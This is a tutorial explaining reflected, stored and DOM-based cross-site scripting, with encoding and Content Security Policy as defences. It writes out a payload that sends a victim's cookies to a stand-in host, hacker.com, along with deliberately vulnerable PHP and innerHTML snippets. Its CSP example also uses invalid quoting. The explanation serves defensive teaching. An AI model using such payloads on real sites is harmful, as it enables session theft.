# Cross-Site Scripting (XSS) Explained

## The Problem: Malicious JavaScript in the Browser
Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim's browser. 

Since the script runs in the context of the victim's session, the attacker can steal cookies, forge requests, and alter the page content.

## Type 1: Reflected XSS
The payload is embedded in the URL and "reflected" back by the server.

**Scenario:** A search page.
```html
<!-- Vulnerable Server Code (PHP) -->
<h1>You searched for: <?php echo $_GET['query']; ?></h1>
```

The attacker sends the victim a link:
`https://vulnerable.com/search?query=<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>`

When the victim clicks the link, the server echoes the script directly into the HTML. The victim's browser executes it, sending their session cookie to the hacker.

## Type 2: Stored XSS
The payload is permanently saved on the server (e.g., in a database) and served to any user who views the affected page.

**Scenario:** A comment section.
The attacker posts a comment:
`Great article! <script>/* Malicious Code */</script>`

The server saves this string to the database. Whenever *any* user loads the article, the server serves the comment, and the script executes in their browser. This is how the famous MySpace "Samy worm" spread exponentially.

## Type 3: DOM-Based XSS
The vulnerability exists entirely in the client-side JavaScript. The server never sees the payload.

**Scenario:** A single-page application (SPA).
```javascript
// Vulnerable Client-Side Code
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = name;
```

If the URL is `app.com/?name=<img src=x onerror=alert(1)>`, the browser parses the `name` parameter and inserts it directly into the Document Object Model (DOM). The `onerror` event fires, executing the payload.

## The Architecture of Defense

### 1. Context-Aware Output Encoding
You must encode data based on where it is being placed in the HTML document.
- **HTML Body:** Convert `<` to `&lt;`, `>` to `&gt;`.
- **JavaScript Variables:** Unicode escape sequences.
- **Attributes:** Convert `"` to `&quot;`.

Modern frameworks like React and Angular do this automatically for HTML body injection:
```jsx
// React is safe by default
const greeting = "Hello <script>alert('XSS')</script>";
return <div>{greeting}</div>; // Renders as plain text, not HTML
```

### 2. Content Security Policy (CSP)
A CSP is an HTTP header that tells the browser which sources of executable scripts are approved.

```http
Content-Security-Policy: default-src 'self'; script-src 'https://trusted.cdn.com'
```
With this header, even if an attacker successfully injects a `<script>` tag, the browser will refuse to execute it because it is not from a trusted source.
